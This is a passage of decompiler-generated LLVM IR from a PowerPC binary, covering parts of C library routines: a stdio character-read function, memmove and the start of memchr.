  %v2_10021b74 = icmp ugt i32 %v1_10021b70, 128
  br i1 %v2_10021b74, label %dec_label_pc_10021b8c, label %dec_label_pc_10021b7c

dec_label_pc_10021b7c:                            ; preds = %dec_label_pc_10021b6c
  store i32 268573572, i32* @lr, align 4
  %v3_10021b80 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10021b5c)
  store i32 %v3_10021b80, i32* %r3.global-to-local, align 4
  %v3_10021b84 = icmp eq i32 %v3_10021b80, 0
  br i1 %v3_10021b84, label %dec_label_pc_10021b7c.dec_label_pc_10021b8c_crit_edge, label %dec_label_pc_10021c68

dec_label_pc_10021b7c.dec_label_pc_10021b8c_crit_edge: ; preds = %dec_label_pc_10021b7c
  %v0_10021b8c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021b8c

dec_label_pc_10021b8c:                            ; preds = %dec_label_pc_10021b7c.dec_label_pc_10021b8c_crit_edge, %dec_label_pc_10021b6c
  %v2_10021bec = phi i32 [ %v0_10021b8c.pre, %dec_label_pc_10021b7c.dec_label_pc_10021b8c_crit_edge ], [ %tmp, %dec_label_pc_10021b6c ]
  %v1_10021b8c = inttoptr i32 %v2_10021bec to i16*
  %v2_10021b8c = load i16, i16* %v1_10021b8c, align 2
  %v3_10021b8c = zext i16 %v2_10021b8c to i32
  %v1_10021b90 = and i32 %v3_10021b8c, 2
  store i32 %v1_10021b90, i32* %r0.global-to-local, align 4
  %v3_10021b90 = icmp eq i32 %v1_10021b90, 0
  br i1 %v3_10021b90, label %dec_label_pc_10021bbc, label %dec_label_pc_10021b98

dec_label_pc_10021b98:                            ; preds = %dec_label_pc_10021b8c
  %v1_10021b98 = call i32 @__asm_rlwinm(i32 %v3_10021b8c, i32 2, i32 29, i32 29)
  %v1_10021b9c = load i32, i32* @r31, align 4
  %v2_10021b9c = add i32 %v1_10021b9c, %v1_10021b98
  store i32 %v2_10021b9c, i32* %r9.global-to-local, align 4
  %v1_10021ba0 = add i32 %v2_10021b9c, 39
  %v2_10021ba0 = inttoptr i32 %v1_10021ba0 to i8*
  %v3_10021ba0 = load i8, i8* %v2_10021ba0, align 1
  %v4_10021ba0 = zext i8 %v3_10021ba0 to i32
  store i32 %v4_10021ba0, i32* %r0.global-to-local, align 4
  %v1_10021ba4 = add nsw i32 %v3_10021b8c, -1
  store i32 %v1_10021ba4, i32* %r9.global-to-local, align 4
  %v1_10021ba8 = trunc i32 %v1_10021ba4 to i16
  %v3_10021ba8 = inttoptr i32 %v1_10021b9c to i16*
  store i16 %v1_10021ba8, i16* %v3_10021ba8, align 2
  %v0_10021bac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10021bac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10021bb4 = load i32, i32* @r31, align 4
  %v2_10021bb4 = add i32 %v1_10021bb4, 40
  %v3_10021bb4 = inttoptr i32 %v2_10021bb4 to i32*
  store i32 0, i32* %v3_10021bb4, align 4
  br label %dec_label_pc_10021c6c

dec_label_pc_10021bbc:                            ; preds = %dec_label_pc_10021b8c
  %v1_10021bbc = add i32 %v2_10021bec, 16
  %v2_10021bbc = inttoptr i32 %v1_10021bbc to i32*
  %v3_10021bbc = load i32, i32* %v2_10021bbc, align 4
  store i32 %v3_10021bbc, i32* %r9.global-to-local, align 4
  %v1_10021bc0 = add i32 %v2_10021bec, 20
  %v2_10021bc0 = inttoptr i32 %v1_10021bc0 to i32*
  %v3_10021bc0 = load i32, i32* %v2_10021bc0, align 4
  store i32 %v3_10021bc0, i32* %r0.global-to-local, align 4
  %v4_10021bc4 = icmp eq i32 %v3_10021bc0, %v3_10021bbc
  br i1 %v4_10021bc4, label %dec_label_pc_10021bd8, label %dec_label_pc_10021bcc

dec_label_pc_10021bcc:                            ; preds = %dec_label_pc_10021bbc, %entry
  %v1_10021c407 = phi i32 [ %v2_10021bec, %dec_label_pc_10021bbc ], [ %tmp, %entry ]
  %v0_10021bcc = phi i32 [ %v3_10021bbc, %dec_label_pc_10021bbc ], [ %v4_10021b5c, %entry ]
  %v1_10021bcc = inttoptr i32 %v0_10021bcc to i8*
  %v2_10021bcc = load i8, i8* %v1_10021bcc, align 1
  %v3_10021bcc = zext i8 %v2_10021bcc to i32
  store i32 %v3_10021bcc, i32* %r3.global-to-local, align 4
  %v1_10021bd0 = add i32 %v0_10021bcc, 1
  store i32 %v1_10021bd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10021c40

dec_label_pc_10021bd8:                            ; preds = %dec_label_pc_10021bbc
  %v1_10021bd8 = add i32 %v2_10021bec, 4
  %v2_10021bd8 = inttoptr i32 %v1_10021bd8 to i32*
  %v3_10021bd8 = load i32, i32* %v2_10021bd8, align 4
  store i32 %v3_10021bd8, i32* %r0.global-to-local, align 4
  %v3_10021bdc = icmp eq i32 %v3_10021bd8, -2
  br i1 %v3_10021bdc, label %dec_label_pc_10021be4, label %dec_label_pc_10021bf4

dec_label_pc_10021be4:                            ; preds = %dec_label_pc_10021bd8
  %v1_10021be4 = or i32 %v3_10021b8c, 4
  store i32 %v1_10021be4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10021bec = trunc i32 %v1_10021be4 to i16
  store i16 %v1_10021bec, i16* %v1_10021b8c, align 2
  br label %dec_label_pc_10021c6c

dec_label_pc_10021bf4:                            ; preds = %dec_label_pc_10021bd8
  %v1_10021bf4 = and i32 %v3_10021b8c, 768
  store i32 %v1_10021bf4, i32* %r0.global-to-local, align 4
  %v3_10021bf4 = icmp eq i32 %v1_10021bf4, 0
  br i1 %v3_10021bf4, label %dec_label_pc_10021c08, label %dec_label_pc_10021bfc

dec_label_pc_10021bfc:                            ; preds = %dec_label_pc_10021bf4
  store i32 ptrtoint (i32** @global_var_10045148.998 to i32), i32* %r3.global-to-local, align 4
  store i32 268573704, i32* @lr, align 4
  %v4_10021c04 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_10045148.998 to i16*), i32 %v3_10021bbc)
  store i32 %v4_10021c04, i32* %r3.global-to-local, align 4
  %v0_10021c08.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021c08

dec_label_pc_10021c08:                            ; preds = %dec_label_pc_10021bf4, %dec_label_pc_10021bfc
  %v0_10021c48 = phi i32 [ %v2_10021bec, %dec_label_pc_10021bf4 ], [ %v0_10021c08.pre, %dec_label_pc_10021bfc ]
  %v1_10021c08 = add i32 %v0_10021c48, 8
  %v2_10021c08 = inttoptr i32 %v1_10021c08 to i32*
  %v3_10021c08 = load i32, i32* %v2_10021c08, align 4
  store i32 %v3_10021c08, i32* %r9.global-to-local, align 4
  %v1_10021c0c = add i32 %v0_10021c48, 12
  %v2_10021c0c = inttoptr i32 %v1_10021c0c to i32*
  %v3_10021c0c = load i32, i32* %v2_10021c0c, align 4
  store i32 %v3_10021c0c, i32* %r0.global-to-local, align 4
  %v4_10021c10 = icmp eq i32 %v3_10021c0c, %v3_10021c08
  br i1 %v4_10021c10, label %dec_label_pc_10021c48, label %dec_label_pc_10021c18

dec_label_pc_10021c18:                            ; preds = %dec_label_pc_10021c08
  %v2_10021c18 = add i32 %v0_10021c48, 24
  %v3_10021c18 = inttoptr i32 %v2_10021c18 to i32*
  store i32 %v3_10021c08, i32* %v3_10021c18, align 4
  %v0_10021c1c = load i32, i32* @r31, align 4
  store i32 %v0_10021c1c, i32* %r3.global-to-local, align 4
  store i32 268573732, i32* @lr, align 4
  %v3_10021c20 = call i32 @__stdio_rfill(i32 %v0_10021c1c, i32 %v3_10021c08)
  store i32 %v3_10021c20, i32* %r3.global-to-local, align 4
  %v3_10021c24 = icmp eq i32 %v3_10021c20, 0
  br i1 %v3_10021c24, label %dec_label_pc_10021c68, label %dec_label_pc_10021c2c

dec_label_pc_10021c2c:                            ; preds = %dec_label_pc_10021c18
  %v0_10021c2c = load i32, i32* @r31, align 4
  %v1_10021c2c = add i32 %v0_10021c2c, 20
  %v2_10021c2c = inttoptr i32 %v1_10021c2c to i32*
  %v3_10021c2c = load i32, i32* %v2_10021c2c, align 4
  store i32 %v3_10021c2c, i32* %r0.global-to-local, align 4
  %v1_10021c30 = add i32 %v0_10021c2c, 16
  %v2_10021c30 = inttoptr i32 %v1_10021c30 to i32*
  %v3_10021c30 = load i32, i32* %v2_10021c30, align 4
  store i32 %v3_10021c30, i32* %r9.global-to-local, align 4
  %v2_10021c34 = add i32 %v0_10021c2c, 24
  %v3_10021c34 = inttoptr i32 %v2_10021c34 to i32*
  store i32 %v3_10021c2c, i32* %v3_10021c34, align 4
  %v0_10021c38 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021c38 = add i32 %v0_10021c38, 1
  store i32 %v1_10021c38, i32* %r0.global-to-local, align 4
  %v1_10021c3c = inttoptr i32 %v0_10021c38 to i8*
  %v2_10021c3c = load i8, i8* %v1_10021c3c, align 1
  %v3_10021c3c = zext i8 %v2_10021c3c to i32
  store i32 %v3_10021c3c, i32* %r3.global-to-local, align 4
  %v1_10021c40.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021c40

dec_label_pc_10021c40:                            ; preds = %dec_label_pc_10021bcc, %dec_label_pc_10021c2c
  %v1_10021c40 = phi i32 [ %v1_10021c407, %dec_label_pc_10021bcc ], [ %v1_10021c40.pre, %dec_label_pc_10021c2c ]
  %v0_10021c40 = phi i32 [ %v1_10021bd0, %dec_label_pc_10021bcc ], [ %v1_10021c38, %dec_label_pc_10021c2c ]
  %v2_10021c40 = add i32 %v1_10021c40, 16
  %v3_10021c40 = inttoptr i32 %v2_10021c40 to i32*
  store i32 %v0_10021c40, i32* %v3_10021c40, align 4
  br label %dec_label_pc_10021c6c

dec_label_pc_10021c48:                            ; preds = %dec_label_pc_10021c08
  %v1_10021c48 = inttoptr i32 %v0_10021c48 to i16*
  store i32 %v0_10021c48, i32* %r3.global-to-local, align 4
  %v2_10021c4c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268573784, i32* @lr, align 4
  %v5_10021c54 = call i32 @__stdio_READ(i16* %v1_10021c48, i32 %v2_10021c4c, i32 1)
  store i32 %v5_10021c54, i32* %r3.global-to-local, align 4
  %v3_10021c58 = icmp eq i32 %v5_10021c54, 0
  br i1 %v3_10021c58, label %dec_label_pc_10021c68, label %dec_label_pc_10021c60

dec_label_pc_10021c60:                            ; preds = %dec_label_pc_10021c48
  %v3_10021c60 = load i8, i8* %stack_var_-24, align 1
  %v4_10021c60 = sext i8 %v3_10021c60 to i32
  store i32 %v4_10021c60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021c6c

dec_label_pc_10021c68:                            ; preds = %dec_label_pc_10021b7c, %dec_label_pc_10021c48, %dec_label_pc_10021c18
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10021c6c

dec_label_pc_10021c6c:                            ; preds = %dec_label_pc_10021c60, %dec_label_pc_10021c40, %dec_label_pc_10021be4, %dec_label_pc_10021b98, %dec_label_pc_10021c68
  store i32 %v0_10021b48, i32* %r0.global-to-local, align 4
  store i32 %v0_10021b50, i32* @r31, align 4
  %v0_10021c7c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10021c7c

; uselistorder directives
  uselistorder i32 %v0_10021c48, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10021bcc, { 1, 0 }
  uselistorder i32 %v3_10021bbc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10021b9c, { 1, 0 }
  uselistorder i32 %v3_10021b8c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10021bec, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 11, 2, 3, 1, 4, 5, 6, 7, 14, 8, 9, 10, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_10045148.998 to i16*), { 1, 0 }
  uselistorder i16* @global_var_10044d90.997, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10021c6c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10021c68, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10021c40, { 1, 0 }
  uselistorder label %dec_label_pc_10021c08, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10021c80 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* @r8, align 4
  %v0_10021c88 = load i32, i32* @r5, align 4
  store i32 %v0_10021c88, i32* @r11, align 4
  br i1 %v2_10021c80, label %dec_label_pc_10021c94, label %dec_label_pc_10021c90

dec_label_pc_10021c90:                            ; preds = %entry
  %v0_10021c90 = call i32 @memcpy()
  store i32 %v0_10021c90, i32* @r3, align 4
  %v0_10021c94.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10021c94

dec_label_pc_10021c94:                            ; preds = %entry, %dec_label_pc_10021c90
  %v0_10021c94 = phi i32 [ %v0_10021c88, %entry ], [ %v0_10021c94.pre, %dec_label_pc_10021c90 ]
  %v1_10021c94 = call i32 @__asm_rlwinm.(i32 %v0_10021c94, i32 29, i32 3, i32 31)
  store i32 %v1_10021c94, i32* %r9.global-to-local, align 4
  %v4_10021c94 = icmp eq i32 %v1_10021c94, 0
  %v1_10021c98 = load i32, i32* @r5, align 4
  %v2_10021c98 = add i32 %v1_10021c98, %arg2
  store i32 %v2_10021c98, i32* %r4.global-to-local, align 4
  %v0_10021c9c = load i32, i32* @r3, align 4
  %v2_10021c9c = add i32 %v0_10021c9c, %v1_10021c98
  store i32 %v2_10021c9c, i32* @r10, align 4
  br i1 %v4_10021c94, label %dec_label_pc_10021cc4, label %dec_label_pc_10021ca4

dec_label_pc_10021ca4:                            ; preds = %dec_label_pc_10021c94
  %v1_10021ca4 = urem i32 %v2_10021c9c, 4
  %v3_10021ca4 = icmp eq i32 %v1_10021ca4, 0
  br i1 %v3_10021ca4, label %dec_label_pc_10021cac, label %dec_label_pc_10021cf8

dec_label_pc_10021cac:                            ; preds = %dec_label_pc_10021d10.dec_label_pc_10021cac_crit_edge, %dec_label_pc_10021ca4
  %v1_10021cb8.pre = phi i32 [ %v1_10021cb8.pre.pre, %dec_label_pc_10021d10.dec_label_pc_10021cac_crit_edge ], [ %v2_10021c9c, %dec_label_pc_10021ca4 ]
  %v0_10021cac = phi i32 [ %v1_10021d10, %dec_label_pc_10021d10.dec_label_pc_10021cac_crit_edge ], [ %v1_10021c94, %dec_label_pc_10021ca4 ]
  store i32 %v0_10021cac, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10021cb0

dec_label_pc_10021cb0:                            ; preds = %dec_label_pc_10021cb0, %dec_label_pc_10021cac
  %v1_10021cb8 = phi i32 [ %v2_10021cbc, %dec_label_pc_10021cb0 ], [ %v1_10021cb8.pre, %dec_label_pc_10021cac ]
  %v0_10021cb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021cb0 = add i32 %v0_10021cb0, -4
  %v2_10021cb0 = inttoptr i32 %v1_10021cb0 to i32*
  %v3_10021cb0 = load i32, i32* %v2_10021cb0, align 4
  %v1_10021cb4 = add i32 %v0_10021cb0, -8
  %v2_10021cb4 = inttoptr i32 %v1_10021cb4 to i32*
  %v3_10021cb4 = load i32, i32* %v2_10021cb4, align 4
  store i32 %v3_10021cb4, i32* %r9.global-to-local, align 4
  store i32 %v1_10021cb4, i32* %r4.global-to-local, align 4
  %v2_10021cb8 = add i32 %v1_10021cb8, -4
  %v3_10021cb8 = inttoptr i32 %v2_10021cb8 to i32*
  store i32 %v3_10021cb0, i32* %v3_10021cb8, align 4
  %v0_10021cbc = load i32, i32* %r9.global-to-local, align 4
  %v1_10021cbc = load i32, i32* @r10, align 4
  %v2_10021cbc = add i32 %v1_10021cbc, -8
  %v3_10021cbc = inttoptr i32 %v2_10021cbc to i32*
  store i32 %v0_10021cbc, i32* %v3_10021cbc, align 4
  store i32 %v2_10021cbc, i32* @r10, align 4
  %v0_10021cc0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021cc0 = add i32 %v0_10021cc0, -1
  store i32 %v1_10021cc0, i32* %ctr.global-to-local, align 4
  %v2_10021cc0 = icmp eq i32 %v1_10021cc0, 0
  br i1 %v2_10021cc0, label %dec_label_pc_10021cc4, label %dec_label_pc_10021cb0

dec_label_pc_10021cc4:                            ; preds = %dec_label_pc_10021cb0, %dec_label_pc_10021d10, %dec_label_pc_10021c94
  %v0_10021cc4 = load i32, i32* @r11, align 4
  %v1_10021cc4 = urem i32 %v0_10021cc4, 8
  store i32 %v1_10021cc4, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10021cc4, 4
  br i1 %tmp, label %dec_label_pc_10021cdc, label %dec_label_pc_10021cd0

dec_label_pc_10021cd0:                            ; preds = %dec_label_pc_10021cc4
  %v0_10021cd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021cd0 = add i32 %v0_10021cd0, -4
  %v2_10021cd0 = inttoptr i32 %v1_10021cd0 to i32*
  %v3_10021cd0 = load i32, i32* %v2_10021cd0, align 4
  store i32 %v1_10021cd0, i32* %r4.global-to-local, align 4
  %v1_10021cd4 = add nsw i32 %v1_10021cc4, -4
  store i32 %v1_10021cd4, i32* %r5.global-to-local, align 4
  %v1_10021cd8 = load i32, i32* @r10, align 4
  %v2_10021cd8 = add i32 %v1_10021cd8, -4
  %v3_10021cd8 = inttoptr i32 %v2_10021cd8 to i32*
  store i32 %v3_10021cd0, i32* %v3_10021cd8, align 4
  store i32 %v2_10021cd8, i32* @r10, align 4
  %v0_10021cdc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021cdc

dec_label_pc_10021cdc:                            ; preds = %dec_label_pc_10021cc4, %dec_label_pc_10021cd0
  %v0_10021ce4 = phi i32 [ %v1_10021cc4, %dec_label_pc_10021cc4 ], [ %v0_10021cdc.pre, %dec_label_pc_10021cd0 ]
  %v3_10021cdc = icmp eq i32 %v0_10021ce4, 0
  br i1 %v3_10021cdc, label %dec_label_pc_10021d1c, label %dec_label_pc_10021ce4

dec_label_pc_10021ce4:                            ; preds = %dec_label_pc_10021cdc
  store i32 %v0_10021ce4, i32* %ctr.global-to-local, align 4
  %v2_10021cec.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_10021ce8

dec_label_pc_10021ce8:                            ; preds = %dec_label_pc_10021ce8, %dec_label_pc_10021ce4
  %v2_10021cec = phi i32 [ %v3_10021cec, %dec_label_pc_10021ce8 ], [ %v2_10021cec.pre, %dec_label_pc_10021ce4 ]
  %v0_10021ce8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10021ce8 = add i32 %v0_10021ce8, -1
  %v2_10021ce8 = inttoptr i32 %v1_10021ce8 to i8*
  %v3_10021ce8 = load i8, i8* %v2_10021ce8, align 1
  store i32 %v1_10021ce8, i32* %r4.global-to-local, align 4
  %v3_10021cec = add i32 %v2_10021cec, -1
  %v4_10021cec = inttoptr i32 %v3_10021cec to i8*
  store i8 %v3_10021ce8, i8* %v4_10021cec, align 1
  store i32 %v3_10021cec, i32* @r10, align 4
  %v0_10021cf0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021cf0 = add i32 %v0_10021cf0, -1
  store i32 %v1_10021cf0, i32* %ctr.global-to-local, align 4
  %v2_10021cf0 = icmp eq i32 %v1_10021cf0, 0
  br i1 %v2_10021cf0, label %dec_label_pc_10021d1c, label %dec_label_pc_10021ce8

dec_label_pc_10021cf8:                            ; preds = %dec_label_pc_10021ca4
  %v1_10021cf8 = sub nsw i32 4, %v1_10021ca4
  store i32 %v1_10021cf8, i32* %ctr.global-to-local, align 4
  %v2_10021d00 = sub i32 %v1_10021c98, %v1_10021cf8
  store i32 %v2_10021d00, i32* @r11, align 4
  %v1_10021d049 = add i32 %v2_10021c98, -1
  %v2_10021d0410 = inttoptr i32 %v1_10021d049 to i8*
  %v3_10021d0411 = load i8, i8* %v2_10021d0410, align 1
  store i32 %v1_10021d049, i32* %r4.global-to-local, align 4
  %v3_10021d0813 = add i32 %v2_10021c9c, -1
  %v4_10021d0814 = inttoptr i32 %v3_10021d0813 to i8*
  store i8 %v3_10021d0411, i8* %v4_10021d0814, align 1
  store i32 %v3_10021d0813, i32* @r10, align 4
  %v0_10021d0c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021d0c16 = add i32 %v0_10021d0c15, -1
  store i32 %v1_10021d0c16, i32* %ctr.global-to-local, align 4
  %v2_10021d0c17 = icmp eq i32 %v1_10021d0c16, 0
  br i1 %v2_10021d0c17, label %dec_label_pc_10021d10, label %dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge

dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge: ; preds = %dec_label_pc_10021cf8, %dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge
  %v3_10021d0818 = phi i32 [ %v3_10021d08, %dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge ], [ %v3_10021d0813, %dec_label_pc_10021cf8 ]
  %v0_10021d04.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10021d04 = add i32 %v0_10021d04.pre, -1
  %v2_10021d04 = inttoptr i32 %v1_10021d04 to i8*
  %v3_10021d04 = load i8, i8* %v2_10021d04, align 1
  store i32 %v1_10021d04, i32* %r4.global-to-local, align 4
  %v3_10021d08 = add i32 %v3_10021d0818, -1
  %v4_10021d08 = inttoptr i32 %v3_10021d08 to i8*
  store i8 %v3_10021d04, i8* %v4_10021d08, align 1
  store i32 %v3_10021d08, i32* @r10, align 4
  %v0_10021d0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021d0c = add i32 %v0_10021d0c, -1
  store i32 %v1_10021d0c, i32* %ctr.global-to-local, align 4
  %v2_10021d0c = icmp eq i32 %v1_10021d0c, 0
  br i1 %v2_10021d0c, label %dec_label_pc_10021d10, label %dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge

dec_label_pc_10021d10:                            ; preds = %dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge, %dec_label_pc_10021cf8
  %v0_10021d10 = load i32, i32* @r11, align 4
  %v1_10021d10 = call i32 @__asm_rlwinm.(i32 %v0_10021d10, i32 29, i32 3, i32 31)
  store i32 %v1_10021d10, i32* %r9.global-to-local, align 4
  %v4_10021d10 = icmp eq i32 %v1_10021d10, 0
  br i1 %v4_10021d10, label %dec_label_pc_10021cc4, label %dec_label_pc_10021d10.dec_label_pc_10021cac_crit_edge

dec_label_pc_10021d10.dec_label_pc_10021cac_crit_edge: ; preds = %dec_label_pc_10021d10
  %v1_10021cb8.pre.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_10021cac

dec_label_pc_10021d1c:                            ; preds = %dec_label_pc_10021ce8, %dec_label_pc_10021cdc
  %v0_10021d1c = load i32, i32* @r8, align 4
  ret i32 %v0_10021d1c

; uselistorder directives
  uselistorder i32 %v1_10021d10, { 1, 2, 0 }
  uselistorder i32 %v1_10021d0c, { 1, 0 }
  uselistorder i32 %v3_10021d08, { 1, 2, 0 }
  uselistorder i32 %v1_10021cf0, { 1, 0 }
  uselistorder i32 %v3_10021cec, { 1, 2, 0 }
  uselistorder i32 %v1_10021cc4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10021cc0, { 1, 0 }
  uselistorder i32 %v2_10021cbc, { 1, 2, 0 }
  uselistorder i32 %v1_10021ca4, { 1, 0 }
  uselistorder i32 %v2_10021c9c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10021c98, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder label %dec_label_pc_10021d04.dec_label_pc_10021d04_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10021cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10021cc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10021c94, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10021d28 = urem i32 %arg1, 256
  store i32 %v1_10021d28, i32* %r4.global-to-local, align 4
  %v0_10021d487 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_10021d4c13 = icmp eq i32 %arg2, 0
  br i1 %v2_10021d4c13, label %dec_label_pc_10021d54, label %dec_label_pc_10021d50

dec_label_pc_10021d34:                            ; preds = %dec_label_pc_10021d50
  %v1_10021d34 = inttoptr i32 %v0_10021d34 to i8*
  %v2_10021d34 = load i8, i8* %v1_10021d34, align 1
  %v3_10021d34 = zext i8 %v2_10021d34 to i32
  %v0_10021d38 = load i32, i32* %r5.global-to-local, align 4
  %v1_10021d38 = add i32 %v0_10021d38, -1
  store i32 %v1_10021d38, i32* %r5.global-to-local, align 4
  %v1_10021d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_10021d3c = icmp eq i32 %v3_10021d34, %v1_10021d3c
  %v0_10021d40 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021d3c, i32 %v0_10021d40)
  %v0_10021d44 = load i32, i32* @r3, align 4
  %v1_10021d44 = add i32 %v0_10021d44, 1
  store i32 %v1_10021d44, i32* @r3, align 4
  %v0_10021d4c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021d4c = add i32 %v0_10021d4c, -1
  store i32 %v1_10021d4c, i32* %ctr.global-to-local, align 4
  %v2_10021d4c = icmp eq i32 %v1_10021d4c, 0
  br i1 %v2_10021d4c, label %dec_label_pc_10021d54.loopexit, label %dec_label_pc_10021d50

dec_label_pc_10021d50:                            ; preds = %entry, %dec_label_pc_10021d34
  %v0_10021d34 = phi i32 [ %v1_10021d44, %dec_label_pc_10021d34 ], [ %v0_10021d487, %entry ]
  %v0_10021d50.in.in = phi i32 [ %v1_10021d44, %dec_label_pc_10021d34 ], [ %v0_10021d487, %entry ]
  %v0_10021d50.in = urem i32 %v0_10021d50.in.in, 4
  %v0_10021d50 = icmp eq i32 %v0_10021d50.in, 0
  br i1 %v0_10021d50, label %dec_label_pc_10021d54.loopexit, label %dec_label_pc_10021d34

dec_label_pc_10021d54.loopexit:                   ; preds = %dec_label_pc_10021d50, %dec_label_pc_10021d34
  %v0_10021d7c16.ph = phi i32 [ %v1_10021d44, %dec_label_pc_10021d34 ], [ %v0_10021d34, %dec_label_pc_10021d50 ]
  %v0_10021d54.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10021d58.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021d54

dec_label_pc_10021d54:                            ; preds = %dec_label_pc_10021d54.loopexit, %entry
  %v0_10021d58 = phi i32 [ 0, %entry ], [ %v0_10021d58.pre, %dec_label_pc_10021d54.loopexit ]
  %v0_10021d54 = phi i32 [ %v1_10021d28, %entry ], [ %v0_10021d54.pre, %dec_label_pc_10021d54.loopexit ]
  %v0_10021d7c16 = phi i32 [ %v0_10021d487, %entry ], [ %v0_10021d7c16.ph, %dec_label_pc_10021d54.loopexit ]
  %v1_10021d54 = mul i32 %v0_10021d54, 256
  %v1_10021d58 = udiv i32 %v0_10021d58, 4
  %v2_10021d5c = or i32 %v1_10021d54, %v0_10021d54
  %v1_10021d60 = add nuw nsw i32 %v1_10021d58, 1
  store i32 %v1_10021d60, i32* @r11, align 4
  %v1_10021d64 = mul i32 %v2_10021d5c, 65536
  %v2_10021d70 = or i32 %v1_10021d64, %v2_10021d5c
  store i32 %v1_10021d58, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10021d58, 4
  br i1 %tmp, label %dec_label_pc_10021e04, label %dec_label_pc_10021d7c

dec_label_pc_10021d7c:                            ; preds = %dec_label_pc_10021d54, %dec_label_pc_10021e00.backedge
  %v0_10021e00 = phi i32 [ %v1_10021e00, %dec_label_pc_10021e00.backedge ], [ %v1_10021d58, %dec_label_pc_10021d54 ]
  %v0_10021d84 = phi i32 [ %v1_10021d84, %dec_label_pc_10021e00.backedge ], [ %v0_10021d58, %dec_label_pc_10021d54 ]
  %v0_10021dbc = phi i32 [ %v1_10021d80, %dec_label_pc_10021e00.backedge ], [ %v0_10021d7c16, %dec_label_pc_10021d54 ]
  %v1_10021d7c = inttoptr i32 %v0_10021dbc to i32*
  %v2_10021d7c = load i32, i32* %v1_10021d7c, align 4
  %v1_10021d80 = add i32 %v0_10021dbc, 4
  store i32 %v1_10021d80, i32* @r3, align 4
  %v1_10021d84 = add i32 %v0_10021d84, -4
  store i32 %v1_10021d84, i32* %r5.global-to-local, align 4
  %v1_10021d88 = add i32 %v0_10021dbc, 1
  store i32 %v1_10021d88, i32* @r10, align 4
  %v2_10021d8c = xor i32 %v2_10021d7c, %v2_10021d70
  %v1_10021d94 = add i32 %v2_10021d8c, 2130640639
